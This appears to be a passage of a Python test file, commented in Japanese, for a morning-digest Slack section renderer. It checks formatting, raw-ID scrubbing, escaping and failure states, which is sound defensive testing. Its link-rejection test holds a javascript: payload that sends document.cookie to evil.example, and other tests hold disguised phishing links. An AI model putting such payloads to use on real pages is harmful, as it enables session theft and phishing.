"""朝ダイジェスト DM の「💬 Slack 返信漏れ」セクション描画と skill 側マッピングのテスト。

runner（scripts/run_morning_digest_fargate.py）は test_mail_feature_edge と同じく
importlib でロードする。外部 I/O 無し。
"""

from __future__ import annotations

import datetime as dt
import importlib.util
import sys
from pathlib import Path
from types import SimpleNamespace
from typing import Any

from teamagent.skills._shared.slack_unreplied import UnrepliedCollection, UnrepliedMention
from teamagent.skills.base import SkillContext
from teamagent.skills.morning_digest.calendar_window import now_jst as _calwin_now
from teamagent.skills.morning_digest.schema import (
    MorningDigestInput,
    MorningDigestOutput,
    SlackUnreadItem,
)
from teamagent.skills.morning_digest.skill import MorningDigestSkill

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent
SCRIPT_PATH = PROJECT_ROOT / "scripts" / "run_morning_digest_fargate.py"


def _load() -> Any:
    spec = importlib.util.spec_from_file_location("run_md_slack_section_under_test", SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules["run_md_slack_section_under_test"] = module
    spec.loader.exec_module(module)
    return module


runner = _load()
ME = "me@vectorinc.co.jp"


# ── 💬 Slack 返信漏れセクションの描画（承認済みモックの実寸を固定する）──────────

_JST = dt.timezone(dt.timedelta(hours=9))
#: 2026-08-20 は木曜。fixture の 8/17=月 / 8/28=金 はすべて実カレンダー。
_NOW = dt.datetime(2026, 8, 20, 9, 30, tzinfo=_JST)
_ME_UID = "U0B990FG03T"  # 本番の bot ではなく「本人」に見立てた実 ID 形式
#: 本文を 1500 字（schema 上限＝「途中で切れている」の印）まで伸ばす詰め物。
_FILLER = "経緯は前回の議事録に記載しています。" * 90

#: 承認済みモックの実寸。ここを書き換えるときは必ず人間の目で読んでからにする。
#:
#: 2026-08-20 レビュー指摘の反映で、承認時点の版から 3 箇所だけ変えている:
#:   ① 1件目 `・DM` → `・DM（森田）`。data 層が users.info で解決した差出人名を描画が
#:      捨てていた（DM が並ぶと誰が待っているのか分からない・API コストだけ払っていた）。
#:   ② 3件目 `・期限 8/28(金)` → `・2日経過`。「28(金)の条件変更」の日付は **期限として
#:      書かれていない**（「の」で名詞に係る）。期限を騙ると本物の滞留時間を押し出す。
#:   ③ 脚注。見出しは逐語ではなく「切り出し＋定型語尾」なので、そう名乗る。
_MOCK_SECTION = """💬 *Slack 返信漏れ 5件* ｜ あなたの番 3・様子見 1・見るだけ 1

🔴 *あなたの番（3件）*
1. *引継ぎタスク3件を引き取る* ・DM（森田） ・2日経過 ・15分 〔<https://vector.slack.com/archives/D08MORITA01/p1755478320|開く>〕
2. *来社日を返す*（NTVカードの受け渡し） ・DM ・3日経過 ・1分 〔<https://vector.slack.com/archives/D08NTVDESK9/p1755410520|開く>〕
3. *28(金)の条件変更を確認* ・グループDM ・2日経過 ・2分 〔<https://vector.slack.com/archives/G08COND1234/p1755509000|開く>〕
　└ 本文が途中で切れており、未取得の部分があります

⏸ *様子見（1件）*
4. *AI相談は当日が過ぎている* ・グループDM ・2日経過 ・他1名も名指し ・相談日 8/17(月) を過ぎています 〔<https://vector.slack.com/archives/G08AISOUDAN/p1755475200|開く>〕

👁 *見るだけ（1件）*
5. *情シスの承認後にあなたから再依頼* ・DM ・1日経過 ・いま返信不要 〔<https://vector.slack.com/archives/D08JOUSHIS1/p1755568800|開く>〕

※ 見出しは原文からの切り出し＋定型の語尾です（要約文は作りません）。"""

#: 生 ID の「形」（U/W=ユーザー・B=bot・C/D/G=会話・T=WS ＋ 英数8文字以上）。
#: ⚠️ **検査用**。実装はこの形で総当たり置換しない（"CONFIDENTIAL" "@BUZZFEEDJAPAN" の
#: ような全大文字の普通の語まで潰して原文の意味を壊すため）。掃除は実在 ID の完全一致のみ。
_ID_SHAPE_RE = __import__("re").compile(r"(?<![0-9A-Za-z])[UWBCDGT][A-Z0-9]{7,20}(?![0-9A-Za-z])")


def _mock_items() -> list[SlackUnreadItem]:
    """SPEC の 5 件（判定層 fixture と同じ本文・ID だけ実 ID 形式に置き換え）。"""
    return [
        SlackUnreadItem(  # ① 作業引き取り（DM・2日経過・15分）
            excerpt_display=(
                f"<@{_ME_UID}> おはようございます。引継ぎタスク3件を引き取ってもらえますか？"
                "リストは共有済みです。"
            ),
            occurred_at="2026-08-18T10:12:00+09:00",
            channel_id="D08MORITA01",
            channel_kind="dm",
            from_user_id="U08MORITA01",
            from_display_name="森田",
            mentioned_user_ids=[_ME_UID],
            permalink="https://vector.slack.com/archives/D08MORITA01/p1755478320",
        ),
        SlackUnreadItem(  # ② 日程回答（DM・3日経過・1分）
            excerpt_display=f"<@{_ME_UID}> NTVカードの受け渡しの件、来社日を教えてください。",
            occurred_at="2026-08-17T15:02:00+09:00",
            channel_id="D08NTVDESK9",
            channel_kind="dm",
            mentioned_user_ids=[_ME_UID],
            permalink="https://vector.slack.com/archives/D08NTVDESK9/p1755410520",
        ),
        SlackUnreadItem(  # ③ 返信のみ＋期限（グループDM）＋本文が途中で切れている
            excerpt_display=(f"<@{_ME_UID}> 28(金)の条件変更をご確認お願いします。" + _FILLER)[
                :1500
            ],
            occurred_at="2026-08-18T18:40:00+09:00",
            channel_id="G08COND1234",
            channel_kind="group_dm",
            mentioned_user_ids=[_ME_UID],
            permalink="https://vector.slack.com/archives/G08COND1234/p1755509000",
        ),
        SlackUnreadItem(  # ④ 様子見（相談日が過ぎている・他1名も名指し）
            excerpt_display=(
                f"<@{_ME_UID}> <@U08TANAKA22> AI相談の件、8/17(月)にお願いできますか？"
            ),
            occurred_at="2026-08-18T09:00:00+09:00",
            channel_id="G08AISOUDAN",
            channel_kind="group_dm",
            mentioned_user_ids=[_ME_UID, "U08TANAKA22"],
            permalink="https://vector.slack.com/archives/G08AISOUDAN/p1755475200",
        ),
        SlackUnreadItem(  # ⑤ 見るだけ（前提が他人側にある＝いま返信不要）
            excerpt_display=(
                f"<@{_ME_UID}> 情シスの承認後に、あなたから再依頼をお願いします。"
                "今は待ちで大丈夫です。"
            ),
            occurred_at="2026-08-19T11:00:00+09:00",
            channel_id="D08JOUSHIS1",
            channel_kind="dm",
            mentioned_user_ids=[_ME_UID],
            permalink="https://vector.slack.com/archives/D08JOUSHIS1/p1755568800",
        ),
    ]


def _freeze(monkeypatch: Any) -> None:
    monkeypatch.setattr(runner, "_handoff_now", lambda: _NOW)


def _section_text(blocks: list[dict[str, Any]]) -> str:
    """💬 見出しを含む section を連結して 1 本の文字列に戻す（分割の有無に依存しない）。"""
    texts = [
        b["text"]["text"]
        for b in blocks
        if b.get("type") == "section" and "text" in b.get("text", {})
    ]
    start = next(i for i, t in enumerate(texts) if t.startswith("💬"))
    out = [texts[start]]
    for t in texts[start + 1 :]:
        if t.startswith(("📅", "📬", "🔴", "📭")):
            break
        out.append(t)
    return "\n".join(out)


def _visible(text: str) -> str:
    """ユーザーの目に触れる部分だけ（リンクの URL は「開く」としか表示されない）。"""
    return runner._LINK_MARKUP_RE.sub(lambda m: m.group(2) or "", text)


def test_slack_handoff_section_matches_approved_mock(monkeypatch: Any) -> None:
    """SPEC の 5 件 → 承認済みモックの実寸（旧描画・compact 描画で同一）。"""
    _freeze(monkeypatch)
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=_mock_items(),
        slack_unread_total=5,
        slack_unread_scanned=True,
    )
    for render in (runner._format_block_kit, runner._format_block_kit_compact):
        _t, blocks = render(d, ME)
        assert _section_text(blocks) == _MOCK_SECTION


def test_slack_handoff_section_never_shows_raw_ids(monkeypatch: Any) -> None:
    """生の user_id / channel_id が 1 文字も見えない（permalink の URL は本人に見えない）。"""
    _freeze(monkeypatch)
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=_mock_items(),
        slack_unread_total=5,
        slack_unread_scanned=True,
    )
    _t, blocks = runner._format_block_kit_compact(d, ME)
    visible = _visible(_section_text(blocks))
    assert _ID_SHAPE_RE.search(visible) is None
    for uid in (_ME_UID, "U08MORITA01", "U08TANAKA22", "D08MORITA01", "G08AISOUDAN"):
        assert uid not in visible
    # permalink 自体は壊さない（リンクとしては生きている）。
    assert "<https://vector.slack.com/archives/D08MORITA01/p1755478320|開く>" in _section_text(
        blocks
    )


def test_slack_handoff_hash_only_for_channels(monkeypatch: Any) -> None:
    """`#` はチャンネル（C）だけ。DM / グループDM は種別ラベル・unknown は空欄。"""
    _freeze(monkeypatch)
    body = f"<@{_ME_UID}> 見積の条件をご確認ください。"
    items = [
        SlackUnreadItem(
            excerpt_display=body,
            occurred_at="2026-08-19T09:00:00+09:00",
            channel_id="C08SALES001",
            channel_kind="channel",
            channel_name_display="sales-acme",
            mentioned_user_ids=[_ME_UID],
        ),
        SlackUnreadItem(
            excerpt_display=body,
            occurred_at="2026-08-19T09:00:00+09:00",
            channel_id="D08SALES001",
            channel_kind="dm",
            channel_name_display="U08SOMEONE1",  # DM の channel.name は user_id そのもの
            mentioned_user_ids=[_ME_UID],
        ),
        SlackUnreadItem(
            excerpt_display=body,
            occurred_at="2026-08-19T09:00:00+09:00",
            channel_kind="unknown",
            mentioned_user_ids=[_ME_UID],
        ),
    ]
    d = MorningDigestOutput(user_email_masked="m***@x", slack_unread=items, slack_unread_total=3)
    lines = runner._slack_handoff_lines(d)
    cards = [ln for ln in lines if ln.startswith(("1.", "2.", "3."))]
    assert "・#sales-acme ・" in cards[0]
    assert "・DM ・" in cards[1] and "U08SOMEONE1" not in cards[1] and "#" not in cards[1]
    # unknown は「チャンネル」とも「DM」とも書かない＝会話の chip ごと出さない。
    assert "・DM" not in cards[2] and "チャンネル" not in cards[2] and "#" not in cards[2]


def test_slack_handoff_channel_name_falls_back_when_it_is_an_id(monkeypatch: Any) -> None:
    """チャンネル名が生 ID しか無いときは `#` を付けず「チャンネル」まで下げる。"""
    _freeze(monkeypatch)
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=[
            SlackUnreadItem(
                excerpt_display=f"<@{_ME_UID}> 見積の条件をご確認ください。",
                occurred_at="2026-08-19T09:00:00+09:00",
                channel_id="C091ZSVTKF1",
                channel_kind="channel",
                channel_name_display="C091ZSVTKF1",
                mentioned_user_ids=[_ME_UID],
            )
        ],
        slack_unread_total=1,
    )
    line = runner._slack_handoff_lines(d)[3]
    assert "・チャンネル ・" in line and "C091ZSVTKF1" not in line


def test_slack_handoff_zero_state_says_none_only_when_actually_scanned(
    monkeypatch: Any,
) -> None:
    """走査できたときだけ「なし」と言い切る（0 件でもセクション自体は出す）。"""
    _freeze(monkeypatch)
    d = MorningDigestOutput(user_email_masked="m***@x", slack_unread_scanned=True)
    for render in (runner._format_block_kit, runner._format_block_kit_compact):
        dump = str(render(d, ME)[1])
        assert "💬 *Slack 返信漏れ*: なし" in dump
        assert "あなたの番" not in dump


def test_slack_handoff_zero_state_does_not_claim_none_when_not_scanned(
    monkeypatch: Any,
) -> None:
    """🔴 未走査を「なし」と書かない。

    data 層は fail-open で、機能フラグ OFF・未連携・旧 scope・store 障害・API 失敗が
    すべて「空リスト」に潰れる。ここで「返信漏れなし」と書くのは、見逃し防止が目的の
    機能で最も出してはいけない嘘（旧スコープのまま連携している人に毎朝届く）。
    """
    _freeze(monkeypatch)
    d = MorningDigestOutput(user_email_masked="m***@x")  # scanned 既定 False
    for render in (runner._format_block_kit, runner._format_block_kit_compact):
        dump = str(render(d, ME)[1])
        assert "💬 *Slack 返信漏れ*: なし" not in dump
        assert "確認できませんでした" in dump


def test_slack_handoff_zero_state_reports_failure_from_errors(monkeypatch: Any) -> None:
    """skill が slack: の失敗を errors に積んでいたら、走査済みでも「なし」と言わない。"""
    _freeze(monkeypatch)
    d = MorningDigestOutput(
        user_email_masked="m***@x", slack_unread_scanned=True, errors=["slack: RuntimeError"]
    )
    dump = str(runner._format_block_kit_compact(d, ME)[1])
    assert "💬 *Slack 返信漏れ*: なし" not in dump
    assert "確認できませんでした" in dump


def test_slack_handoff_section_failure_does_not_kill_the_whole_digest(
    monkeypatch: Any,
) -> None:
    """💬 の想定外例外で DM 全体（メール・予定）を落とさない＝セクション単位で縮退する。"""
    _freeze(monkeypatch)

    def _boom(_digest: Any) -> list[str]:
        raise RuntimeError("judgement layer exploded")

    monkeypatch.setattr(runner, "_slack_handoff_lines", _boom)
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=_mock_items(),
        slack_unread_total=5,
        slack_unread_scanned=True,
        calendar_date="2026-08-20",
    )
    for render in (runner._format_block_kit, runner._format_block_kit_compact):
        dump = str(render(d, ME)[1])
        assert "💬 *Slack 返信漏れ*: 表示できませんでした" in dump
        assert "8/20(木) の予定" in dump  # 他セクションは巻き添えにしない


def test_slack_handoff_header_shows_total_and_lower_bound(monkeypatch: Any) -> None:
    """母数 > 表示件数のときは見出しに出す。走査打ち切り時は「N件以上」（下限値）と明示。"""
    _freeze(monkeypatch)
    items = _mock_items()
    d = MorningDigestOutput(user_email_masked="m***@x", slack_unread=items, slack_unread_total=9)
    assert runner._slack_handoff_lines(d)[0].startswith("💬 *Slack 返信漏れ 9件*（うち5件を表示）")
    d2 = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=items,
        slack_unread_total=9,
        slack_unread_truncated=True,
    )
    assert runner._slack_handoff_lines(d2)[0].startswith(
        "💬 *Slack 返信漏れ 9件以上*（うち5件を表示）"
    )


def test_slack_handoff_caps_display_at_five(monkeypatch: Any) -> None:
    """表示は 5 件まで（skill 側が緩んでも描画で Slack の block 上限を割らない）。"""
    _freeze(monkeypatch)
    items = [
        SlackUnreadItem(
            excerpt_display=f"<@{_ME_UID}> 見積{i}の条件をご確認ください。",
            occurred_at="2026-08-19T09:00:00+09:00",
            channel_id="C08SALES001",
            channel_kind="channel",
            channel_name_display="sales-acme",
            mentioned_user_ids=[_ME_UID],
        )
        for i in range(12)
    ]
    d = MorningDigestOutput(user_email_masked="m***@x", slack_unread=items, slack_unread_total=12)
    lines = runner._slack_handoff_lines(d)
    numbered = [ln for ln in lines if runner.re.match(r"^\d+\. ", ln)]
    assert len(numbered) == 5
    assert lines[0].startswith("💬 *Slack 返信漏れ 12件*（うち5件を表示）")


def test_slack_handoff_escapes_fake_link_in_body(monkeypatch: Any) -> None:
    """本文に仕込まれた偽装リンクはラベルだけになり、リンクとしては描画されない。"""
    _freeze(monkeypatch)
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=[
            SlackUnreadItem(
                excerpt_display=(
                    f"<@{_ME_UID}> <https://evil.example/pay|正規の請求ページ>をご確認ください。"
                ),
                occurred_at="2026-08-19T09:00:00+09:00",
                channel_kind="dm",
                mentioned_user_ids=[_ME_UID],
            )
        ],
        slack_unread_total=1,
    )
    line = runner._slack_handoff_lines(d)[3]
    assert "evil.example" not in line
    assert "<" not in line and ">" not in line  # permalink 無し＝山括弧が 1 つも残らない


def test_slack_handoff_escapes_mrkdwn_specials_in_headline(monkeypatch: Any) -> None:
    """原文の `&` `<` `>` は必ずエスケープする（実件名をそのまま mrkdwn に入れるため）。

    偽装リンクは `_flatten_slack_text` がラベルだけに畳むので、escape の実効はこちらで固定する。
    """
    _freeze(monkeypatch)
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=[
            SlackUnreadItem(
                excerpt_display=f"<@{_ME_UID}> A&B社の<条件変更>をご確認ください。",
                occurred_at="2026-08-19T09:00:00+09:00",
                channel_kind="dm",
                mentioned_user_ids=[_ME_UID],
            )
        ],
        slack_unread_total=1,
    )
    line = runner._slack_handoff_lines(d)[3]
    assert "*A&amp;B社の&lt;条件変更&gt;を確認*" in line
    assert "<条件変更>" not in line  # 生の山括弧を残さない（リンク偽装の足場を作らない）


def test_handoff_header_counts_the_whole_population_not_just_the_shown_five(
    monkeypatch: Any,
) -> None:
    """見出しの内訳は **取得できた全件**（表示 5 件の内訳を母数の内訳と誤読させない）。"""
    _freeze(monkeypatch)
    items = [
        SlackUnreadItem(
            excerpt_display=f"<@{_ME_UID}> 見積{i}の条件をご確認ください。",
            occurred_at="2026-08-19T09:00:00+09:00",
            channel_id="C08SALES001",
            channel_kind="channel",
            channel_name_display="sales-acme",
            mentioned_user_ids=[_ME_UID],
            answered_by_other=(i >= 6),  # 6件目以降は「様子見」に落ちる
        )
        for i in range(9)
    ]
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=items,
        slack_unread_total=9,
        slack_unread_scanned=True,
    )
    lines = runner._slack_handoff_lines(d)
    assert lines[0] == "💬 *Slack 返信漏れ 9件*（うち5件を表示） ｜ あなたの番 6・様子見 3"
    # バケット見出しも「取得件数のうち何件を並べたか」を分けて言う。
    assert "🔴 *あなたの番（6件中5件を表示）*" in lines


def test_handoff_channel_chip_is_escaped_exactly_once(monkeypatch: Any) -> None:
    """chip は display 済みで返る。呼び出し側でもう一度通すと `&` が二重に化ける。"""
    _freeze(monkeypatch)
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=[
            SlackUnreadItem(
                excerpt_display=f"<@{_ME_UID}> 見積の条件をご確認ください。",
                occurred_at="2026-08-19T09:00:00+09:00",
                channel_id="C08RND00001",
                channel_kind="channel",
                channel_name_display="r&d-team",
                mentioned_user_ids=[_ME_UID],
            )
        ],
        slack_unread_total=1,
        slack_unread_scanned=True,
    )
    line = runner._slack_handoff_lines(d)[3]
    assert "・#r&amp;d-team ・" in line
    assert "&amp;amp;" not in line


def test_every_chip_goes_through_escape_before_it_is_placed() -> None:
    """chip は 1 つ残らず escape 経路を通す（判定層の文言でも素通しにしない）。

    今の chip は固定語彙と日付だけなので実害は無いが、`&` `<` `>` を素通しにする実装は
    「chip に原文由来の文字列を 1 つ足した日」に即リンク偽装/書式崩れへ変わる。
    ここは経路そのものを固定する（＝将来の 1 行追加を安全側に倒す）。
    """
    card = SimpleNamespace(
        index=1,
        headline="見積の条件を確認",
        context="",
        due_label="",
        elapsed_label="2日経過",
        date_mention_label="A&B社 <条件> の記載あり",  # 原文由来を想定した細工
        effort_label="",
        mentioned_others=0,
        fold_reason="<https://evil.example/pay|正規の請求ページ>",
        permalink="",
    )
    item = SlackUnreadItem(excerpt_display="x", channel_kind="dm")
    line = runner._handoff_card_line(card, item, {}, frozenset())
    assert "A&amp;B社 &lt;条件&gt; の記載あり" in line
    assert "evil.example" not in line  # 偽装リンクはラベルだけに畳まれる
    assert "<" not in line and ">" not in line


def test_handoff_dm_chip_shows_who_is_waiting(monkeypatch: Any) -> None:
    """DM が並んだとき差出人で見分けられる（users.info で引いた実名を捨てない）。"""
    _freeze(monkeypatch)
    body = f"<@{_ME_UID}> 見積の条件をご確認ください。"
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=[
            SlackUnreadItem(
                excerpt_display=body,
                occurred_at="2026-08-19T09:00:00+09:00",
                channel_id="D08MORITA01",
                channel_kind="dm",
                from_user_id="U08MORITA01",
                from_display_name="森田",
                mentioned_user_ids=[_ME_UID],
            ),
            SlackUnreadItem(  # 実名が引けなかった DM は種別だけ（架空の名前を作らない）
                excerpt_display=body,
                occurred_at="2026-08-19T09:00:00+09:00",
                channel_id="D08UNKNOWN1",
                channel_kind="dm",
                from_user_id="U08UNKNOWN1",
                mentioned_user_ids=[_ME_UID],
            ),
        ],
        slack_unread_total=2,
        slack_unread_scanned=True,
    )
    cards = [ln for ln in runner._slack_handoff_lines(d) if ln.startswith(("1.", "2."))]
    assert "・DM（森田） ・" in cards[0]
    assert "・DM ・" in cards[1] and "U08UNKNOWN1" not in cards[1]


def test_handoff_channel_name_is_truncated(monkeypatch: Any) -> None:
    """他の chip は全部有界。チャンネル名だけ 60 字そのまま出さない。"""
    _freeze(monkeypatch)
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=[
            SlackUnreadItem(
                excerpt_display=f"<@{_ME_UID}> 見積の条件をご確認ください。",
                occurred_at="2026-08-19T09:00:00+09:00",
                channel_id="C08LONGNAME1",
                channel_kind="channel",
                channel_name_display="a" * 60,
                mentioned_user_ids=[_ME_UID],
            )
        ],
        slack_unread_total=1,
        slack_unread_scanned=True,
    )
    line = runner._slack_handoff_lines(d)[3]
    assert "・#" + "a" * 23 + "… ・" in line


def test_flatten_folds_channel_and_usergroup_tokens_without_labels() -> None:
    """ラベル無しの `<#C…>` / `<!subteam^S…>` を生 ID のまま見せない（現行 API が返す形）。"""
    assert (
        runner._flatten_slack_text("<#C08GENERAL9> の運用を確認") == "#（表示名なし） の運用を確認"
    )
    assert runner._flatten_slack_text("<#C08GENERAL9|general> の運用") == "#general の運用"
    assert runner._flatten_slack_text("<!subteam^S08DESIGN1|@design> に共有") == "@design に共有"
    assert runner._flatten_slack_text("<!subteam^S08DESIGN1> に共有") == "@（表示名なし） に共有"
    assert runner._flatten_slack_text("<!here> 確認お願いします") == "@here 確認お願いします"


def test_handoff_link_rejects_non_https() -> None:
    """permalink は必ず https。scheme 偽装も平文へのダウングレードも描画しない。"""
    assert runner._handoff_link("https://x.slack.com/archives/C1/p1") == (
        "https://x.slack.com/archives/C1/p1"
    )
    for bad in (
        "javascript:fetch('https://evil.example/'+document.cookie)",
        "http://x.slack.com/archives/C1/p1",
        "https://x.slack.com/a|b",
        "https://x.slack.com/<script>",
        "",
    ):
        assert runner._handoff_link(bad) == ""


def test_guard_placeholder_cannot_be_forged_from_the_body() -> None:
    """本文由来の NUL で permalink 記法を複製できない（退避の目印を乗っ取らせない）。

    `_guard_no_raw_ids` はリンクを "\x00N\x00" へ退避してから ID を掃除する。本文に
    その形を仕込まれると、戻すときに本物の permalink を任意の位置へ複製できてしまう。
    """
    nul = chr(0)
    line = f"1. *{nul}0{nul} の件* 〔<https://x.slack.com/archives/C1/p1|開く>〕"
    out = runner._guard_no_raw_ids(line)
    assert out.count("https://x.slack.com/archives/C1/p1") == 1
    assert nul not in out


def test_time_chip_keeps_elapsed_days_when_the_date_is_not_a_deadline(
    monkeypatch: Any,
) -> None:
    """期限ではない日付が本物の滞留時間（経過日数）を押し出さない。

    ⚠️ ここを 1 本の chip にまとめると、誤検出された「期限」が「2日経過」を消す。
    時間軸の chip（経過日数 or 期限）と、日付語の記載は別の事実として並べる。
    """
    _freeze(monkeypatch)
    d = MorningDigestOutput(
        user_email_masked="m***@x",
        slack_unread=[
            SlackUnreadItem(
                excerpt_display=(
                    f"<@{_ME_UID}> 条件をご確認ください。なお8/17(月)の議事録も共有します。"
                ),
                occurred_at="2026-08-18T09:00:00+09:00",
                channel_kind="dm",
                mentioned_user_ids=[_ME_UID],
            )
        ],
        slack_unread_total=1,
        slack_unread_scanned=True,
    )
    line = runner._slack_handoff_lines(d)[3]
    assert "・2日経過 ・8/17(月) の記載あり ・" in line
    assert "期限" not in line


def test_id_scrubber_uses_the_precompiled_pattern(monkeypatch: Any) -> None:
    """掃除は **事前 compile したパターンを 1 回引く**（ID ごとに re.sub しない）。

    ⚠️ ID ごとにパターン *文字列* で re.sub すると、ID 数が re._MAXCACHE(512) を超えた
    瞬間に全パターンが毎回再コンパイルされ、描画が 22ms → 1.2s に跳ねる（レビュー実測）。
    known_ids は items × (channel/from/thread/mention) で件数に比例して増えるので、
    繁忙受信箱 × 16 名で朝の Fargate タスクに数十秒の CPU が乗る。
    """
    ids = frozenset({f"U{i:07d}A" for i in range(600)})
    calls: list[int] = []
    real = runner._id_scrub_pattern
    monkeypatch.setattr(
        runner, "_id_scrub_pattern", lambda known: (calls.append(len(known)), real(known))[1]
    )
    assert runner._scrub_slack_ids("@U0000001A の件", ids) == "@（表示名なし） の件"
    assert calls == [600]  # 交替パターンを 1 本引くだけ


def test_id_scrubbing_does_not_fall_off_a_cliff_with_many_ids() -> None:
    """ID 数が re のキャッシュ上限を超えても描画が跳ねない（崖を作らない）。

    事前 compile 版は 600 ID × 40 行で数十 ms。ID ごとの re.sub 版は同条件で数十秒
    かかる（実測 1 呼び出しあたり約 1.2 秒）ので、2 秒の閾値でも 100 倍以上の余裕がある。
    """
    import time

    ids = frozenset({f"U{i:07d}A" for i in range(600)})
    line = "1. *見積の条件を確認* ・DM ・2日経過 ・2分 U0000123A"
    start = time.perf_counter()
    for _ in range(40):
        runner._guard_no_raw_ids(line, ids)
    assert time.perf_counter() - start < 2.0


def test_id_scrubber_is_compiled_once_for_the_whole_digest() -> None:
    """生 ID 掃除は 1 本の交替パターンへ **事前 compile**（毎行 ID 数ぶん re.sub しない）。

    ⚠️ ID ごとにパターン文字列で re.sub すると、ID 数が re._MAXCACHE(512) を超えた瞬間に
    全パターンが毎回再コンパイルされ、描画が 22ms → 1.2s に跳ねる（実測）。
    known_ids は items × (channel/from/thread/mention) で件数に比例して増える。
    """
    ids = frozenset({f"U{i:07d}A" for i in range(600)})
    pat = runner._id_scrub_pattern(ids)
    assert pat is not None
    assert runner._id_scrub_pattern(ids) is pat  # memo 化されている（毎回作り直さない）
    out = runner._scrub_slack_ids("@U0000001A と U0000599A の件", ids)
    assert out == "@（表示名なし） と （表示名なし） の件"
    assert runner._id_scrub_pattern(frozenset()) is None


def test_handoff_now_is_the_real_clock() -> None:
    """スナップショットは `_handoff_now` を固定して撮る。本番がその継ぎ目で嘘をつかないこと。"""
    before = _calwin_now()
    got = runner._handoff_now()
    after = _calwin_now()
    assert before <= got <= after
    assert got.utcoffset() == dt.timedelta(hours=9)


def test_handoff_display_resolves_mentions_to_real_names() -> None:
    """`<@U…>` は実名へ。引けなければ架空名を作らず「表示名なし」と明示する。"""
    names = {"U08MORITA01": "森田"}
    assert runner._handoff_display("<@U08MORITA01> の件", names) == "@森田 の件"
    assert runner._handoff_display("<@U08UNKNOWN1> の件", names) == "@（表示名なし） の件"
    # ラベル付きメンションは Slack が付けた表示名をそのまま使う。
    assert runner._handoff_display("<@U08X|小俣翔碁> の件", names) == "@小俣翔碁 の件"


def test_guard_scrubs_ids_that_exist_in_this_digest() -> None:
    """最終検査①: **この digest に実在する ID** の完全一致は落とす。リンク URL は原形で残す。"""
    line = "1. *件* ・U08GGD873QC 〔<https://x.slack.com/archives/C091ZSVTKF1/p1|開く>〕"
    out = runner._guard_no_raw_ids(line, frozenset({"U08GGD873QC", "C091ZSVTKF1"}))
    assert "・（表示名なし） 〔" in out
    assert "<https://x.slack.com/archives/C091ZSVTKF1/p1|開く>" in out  # URL は壊さない


def test_guard_scrubs_ids_hanging_off_an_at_sign() -> None:
    """最終検査②: `@U08…` も **実在 ID の完全一致**のときだけ落とす。

    ⚠️ 形だけで潰すと `@BUZZFEEDJAPAN`（X ハンドル）や `@DESIGNTEAM` まで
    「@（表示名なし）」に化け、どのブランドの話か消える＝原文改変（捏造側）になる。
    実名が引けなかった `<@U…>` は _flatten_slack_text が既に落としているので、
    素の `@英大文字` を形で潰す必要は無い。
    """
    known = frozenset({"U08GGD873QC"})
    assert runner._guard_no_raw_ids("1. *件* ・@U08GGD873QC", known) == "1. *件* ・@（表示名なし）"
    # 実在 ID として渡されていない語は、同じ形でもそのまま残す。
    for line in (
        "1. *@BUZZFEEDJAPAN のタイアップ条件を確認*",
        "1. *連絡は @BIGBOSS2026 まで*",
        "1. *担当は @DESIGNTEAM です*",
    ):
        assert runner._guard_no_raw_ids(line) == line
        assert runner._guard_no_raw_ids(line, known) == line


def test_guard_does_not_eat_ordinary_uppercase_words() -> None:
    """⚠️ 形だけで潰さない。全大文字の普通の語を潰すと原文の意味が壊れる（見逃しより有害）。

    `#CAMPAIGN2026` は生 ID と同じ形だが実在のチャンネル名でもある。だから掃除は
    「@ にぶら下がった形」と「この digest に実在する ID の完全一致」に限っている。
    """
    line = "1. *CONFIDENTIAL資料を確認* ・#CAMPAIGN2026 ・DM"
    assert runner._guard_no_raw_ids(line) == line
    # 実在 ID として渡されたときは、同じ文字列でも落ちる（＝根拠があるときだけ触る）。
    assert "#（表示名なし）" in runner._guard_no_raw_ids(line, frozenset({"CAMPAIGN2026"}))


def _ctx() -> SkillContext:
    return SkillContext(request_id="r", metadata={"user_email": ME})


class _Prov:
    """SlackUnrepliedProvider のフェイク（collect_detailed が現行の契約）。"""

    def __init__(self, collection: UnrepliedCollection) -> None:
        self._collection = collection

    def collect_detailed(self, email: str, horizon: int, rid: str) -> UnrepliedCollection:
        assert horizon == 7  # input 既定値が伝播
        return self._collection


def _mention(**kw: Any) -> UnrepliedMention:
    base: dict[str, Any] = dict(
        channel_id="C1",
        channel_name="sales-acme",
        ts="1000.1",
        text="小俣さん t***@example.com 宛の件",
        permalink="https://x/p1",
        occurred_at="2026-07-10T09:00:00+09:00",
    )
    base.update(kw)
    return UnrepliedMention(**base)


def test_skill_maps_provider_output() -> None:
    prov = _Prov(UnrepliedCollection(items=(_mention(),), total_unreplied=1, scanned=True))
    skill = MorningDigestSkill(slack=prov)
    items, total, truncated, scanned = skill._collect_slack_unread(ME, MorningDigestInput(), _ctx())
    assert scanned is True
    assert len(items) == 1
    it = items[0]
    assert it.channel_name_display == "sales-acme"
    assert it.excerpt_display.startswith("小俣さん")
    assert it.permalink == "https://x/p1"
    # masked/scrubbed 側も埋まる（ログ・監査用）。
    assert it.channel_name_masked and it.excerpt_scrubbed
    assert (total, truncated) == (1, False)


def test_skill_maps_sender_and_thread_context() -> None:
    """差出人・会話種別・スレッド文脈が schema まで落ちる（描画側が判断できる材料）。"""
    prov = _Prov(
        UnrepliedCollection(
            items=(
                _mention(
                    channel_id="D9",
                    channel_name="D9",
                    text="<@U_ME> <@U_OTHER2> 28(金)の条件変更を確認してください",
                    user="U_BOSS",
                    user_display="山田 太郎",
                    channel_kind="dm",
                    thread_message_count=3,
                    thread_participant_ids=("U_BOSS", "U_OTHER2"),
                    thread_last_user_id="U_OTHER2",
                    thread_last_at="2026-07-10T10:00:00+09:00",
                    answered_by_other=True,
                    sender_followed_up=True,
                    mentioned_user_ids=("U_ME", "U_OTHER2"),
                ),
            ),
            total_unreplied=1,
